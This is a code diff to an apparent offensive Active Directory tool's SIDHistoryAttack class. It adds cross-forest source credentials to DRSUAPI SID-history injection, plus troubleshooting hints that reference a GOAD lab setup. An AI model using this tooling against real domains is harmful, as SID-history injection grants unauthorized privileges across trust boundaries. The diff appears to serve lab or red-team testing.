@@ -151,7 +151,10 @@ class SIDHistoryAttack:
 
     def inject_sid_history(self, target_user: str, source_user: str,
                           source_domain: Optional[str] = None,
-                          method: str = METHOD_LDAP) -> bool:
+                          method: str = METHOD_LDAP,
+                          src_creds_user: str = '',
+                          src_creds_domain: str = '',
+                          src_creds_password: str = '') -> bool:
         """
         Inject the SID of a source user into the sIDHistory of a target.
 
@@ -160,9 +163,17 @@ class SIDHistoryAttack:
             source_user: sAMAccountName of source
             source_domain: Source domain (for cross-domain/forest)
             method: 'ldap' or 'drsuapi'
+            src_creds_user: Username for source domain auth (DRSUAPI cross-forest)
+            src_creds_domain: Domain for source domain auth
+            src_creds_password: Password for source domain auth
         """
         if method == self.METHOD_DRSUAPI:
-            return self._inject_via_drsuapi(target_user, source_user, source_domain)
+            return self._inject_via_drsuapi(
+                target_user, source_user, source_domain,
+                src_creds_user=src_creds_user,
+                src_creds_domain=src_creds_domain,
+                src_creds_password=src_creds_password,
+            )
 
         # LDAP method
         logging.info(f"Injecting SID from {source_user} into {target_user} (method: LDAP)")
@@ -226,7 +237,10 @@ class SIDHistoryAttack:
         return self.add_sid_to_history(target_user, sid, method=method)
 
     def _inject_via_drsuapi(self, target_user: str, source_user: str,
-                             source_domain: Optional[str] = None) -> bool:
+                             source_domain: Optional[str] = None,
+                             src_creds_user: str = '',
+                             src_creds_domain: str = '',
+                             src_creds_password: str = '') -> bool:
         """Inject SID History via DRSUAPI RPC (DRSAddSidHistory opnum 20)."""
         if not self.drsuapi_client:
             # Try to auto-connect
@@ -245,6 +259,9 @@ class SIDHistoryAttack:
             src_principal=source_user,
             dst_domain=dst_domain,
             dst_principal=target_user,
+            src_creds_user=src_creds_user,
+            src_creds_domain=src_creds_domain,
+            src_creds_password=src_creds_password,
         )
 
         if success:
@@ -400,6 +417,15 @@ class SIDHistoryAttack:
         """Suggest fixes for common DRSUAPI errors."""
         suggestions = {
             5: "Ensure you have Domain Admin privileges in the destination domain",
+            8521: "Enable 'Audit account management' (Success+Failure) on the source domain DC.\n"
+                  "  On the source DC, run: auditpol /set /category:\"Account Management\" /success:enable /failure:enable",
+            8534: "Source and destination are in the same forest.\n"
+                  "  DRSAddSidHistory (flags=0) only works cross-forest.\n"
+                  "  For same-forest child→parent, use a source in a different forest\n"
+                  "  (e.g., essos.local → north.sevenkingdoms.local in GOAD)",
+            8536: "Enable 'Audit account management' (Success+Failure) on the destination domain DC.\n"
+                  "  On the destination DC, run: auditpol /set /category:\"Account Management\" /success:enable /failure:enable\n"
+                  "  Also enable it on the source DC if not already done",
             8547: "You must connect to the DC that holds the destination domain NC",
             8490: "Cross-forest variant requires source and destination in different forests.\n"
                   "For same-domain, create a sacrificial account and use --method drsuapi-delsrc",
